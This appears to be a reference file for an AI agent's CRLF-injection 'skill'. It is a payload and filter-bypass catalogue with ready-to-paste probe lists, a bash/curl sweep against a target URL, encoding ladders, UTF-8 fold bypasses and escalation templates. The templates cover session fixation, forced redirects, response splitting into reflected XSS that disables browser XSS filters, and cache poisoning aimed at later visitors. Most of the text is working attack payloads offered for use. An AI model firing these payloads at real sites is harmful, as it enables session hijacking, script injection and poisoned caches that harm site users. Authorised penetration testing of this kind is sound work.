# CRLF payload and filter-bypass catalogue — Open WHEN: the basic `%0d%0a` probe is stripped/encoded and you need the full encoding ladder, or you want the ready-to-paste path-prefixed probe list

This is the volume catalogue for the `crlf` skill. The SKILL.md body
carries the high-signal subset; open this file when you need every
encoding variant or the path-prefixed probe list.

All values are HTTP test inputs. CR is `%0d` (`\r`), LF is `%0a`
(`\n`). The empty line that ends the header block is `%0d%0a%0d%0a`.

## Path-prefixed probe list (ready to append after the host)

Each of these is a path/value that forces a `Set-Cookie: crlf=injection`
on a vulnerable handler. They span single-newline, encoded-newline,
double-encoded, path-confusion, and `%uXXXX` carriers — fire the whole
set, because which one survives depends on how many decode passes the
middlebox and origin each run.

```
/%%0a0aSet-Cookie:crlf=injection
/%0aSet-Cookie:crlf=injection
/%0d%0aSet-Cookie:crlf=injection
/%0dSet-Cookie:crlf=injection
/%23%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%23%0dSet-Cookie:crlf=injection
/%25%30%61Set-Cookie:crlf=injection
/%25%30aSet-Cookie:crlf=injection
/%250aSet-Cookie:crlf=injection
/%25250aSet-Cookie:crlf=injection
/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%2F..%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
/%3f%0dSet-Cookie:crlf=injection
/%u000aSet-Cookie:crlf=injection
```

Quick bash sweep against one base URL (swap an existing param for
`/path` injection on path-based handlers):

```bash
base="http://target.tld"
while IFS= read -r p; do
  echo "== $p"
  curl -s -i -o - "$base$p" | grep -i 'crlf=injection' && echo "  >> HIT"
done < probes.txt
```

## Newline carriers, by decode depth

| Form | Decodes to | Use when |
|------|-----------|----------|
| `%0d%0a` | `\r\n` | nothing decoded yet (raw reflection) |
| `%0a` / `%0d` | `\n` / `\r` alone | server terminates a header on a bare LF or CR |
| `%0d%0d%0a` | `\r\r\n` | a normalizer collapses one CR but leaves the rest |
| `%250d%250a` | `%0d%0a` → `\r\n` | one middlebox decode happens before the sink |
| `%25250a` | `%0a` after two decodes | two decode passes in the chain |
| `%%0a0a` | `%0a` then `\n` | partial/greedy decoders |
| `%25%30%61` / `%25%30a` / `%250a` | `%0a` → `\n` | mixed nibble-encoding of `%0a` |
| `%u000a` | `\n` | `%uXXXX` decoders (some Windows/.NET stacks) |

## Path-confusion prefixes

Lead the injected value with one of these so a path normalizer rewrites
the request line but the CR/LF still reaches the header builder:

- `%2e%2e%2f` (`../`), `%2f%2e%2e` (`/..`), `%2F..`
- `%23` (`#`) — truncates the path at the fragment on some routers
- `%3f` (`?`) — truncates at the query on some routers

Example combined forms:
```
/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
/%23%0d%0aSet-Cookie:crlf=injection
/%3f%0d%0aSet-Cookie:crlf=injection
```

## UTF-8 fold carriers (high-byte-strip bypass)

Background: RFC 7230 §3.2.4 says header field values SHOULD stay in
US-ASCII. Some stacks enforce this by stripping out-of-range characters
instead of rejecting the request — and for certain multibyte UTF-8
characters that strip leaves a low byte that IS a control char. Older
Firefox cookie handling did exactly this. Use these when the server
filters ASCII CR/LF but lets multibyte input through:

| Char | URL-encoded | Folds to |
|------|-------------|----------|
| `嘊` | `%E5%98%8A` | `%0A` (LF) |
| `嘍` | `%E5%98%8D` | `%0D` (CR) |
| `嘼` | `%E5%98%BC` | `%3C` (`<`) |
| `嘾` | `%E5%98%BE` | `%3E` (`>`) |

Full fold-based XSS test input (literal then URL-encoded):
```
嘊嘍content-type:text/html嘊嘍location:嘊嘍嘊嘍嘼svg/onload=alert(document.domain)嘾
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28document.domain%28%29%E5%98%BE
```

## Escalation templates

### Session fixation (forced Set-Cookie)
```
?param=value%0d%0aSet-Cookie:%20sessionid=attacker_fixed_value
```
The server's own `Set-Cookie: sessionid=<value>` line plus the injected
one both reach the browser; the victim then authenticates under a
session the tester pre-set.

### Forced redirect (injected Location)
```
?param=value%0d%0aLocation:%20https://example.org
```

### Split body → reflected XSS
Close the header block with a blank line, then write a complete second
response whose body carries the script. Disabling `X-XSS-Protection`
first defeats legacy browser filters:
```
?param=value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<svg%20onload=alert(document.domain)>
```
Chunked-body compact variant:
```
?param=%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

### Cache poisoning
When the split response is cacheable (cacheable status, no
`Cache-Control: no-store`, the injected value is part of the cache
key), inject `Content-Type` / a forged `Content-Length` / a body so the
shared cache stores your variant and serves it to the next visitor of
the same key.

## Verifying with curl

```bash
# 1. Where does the value reflect? (read headers only)
curl -sD - -o /dev/null "http://target.tld/?lang=MARKER123"

# 2. Does CR/LF survive into a new header line?
curl -s -i "http://target.tld/?lang=en%0d%0aX-Crlf-Test:%201" | grep -i '^X-Crlf-Test:'

# 3. Reflected request-header variant
curl -s -i -H $'X-Forwarded-Host: x\r\nX-Crlf-Test: 1' "http://target.tld/"

# 4. Forced cookie
curl -s -i "http://target.tld/?lang=en%0d%0aSet-Cookie:%20crlf=injection" | grep -i '^Set-Cookie:'
```

## References
- CWE-93: Improper Neutralization of CRLF Sequences (OWASP CRLF Injection).
- "CRLF injection on Twitter / why blacklists fail" — XSS Jigsaw, 2015.
- PortSwigger: HTTP/2 request splitting via CRLF injection (lab).
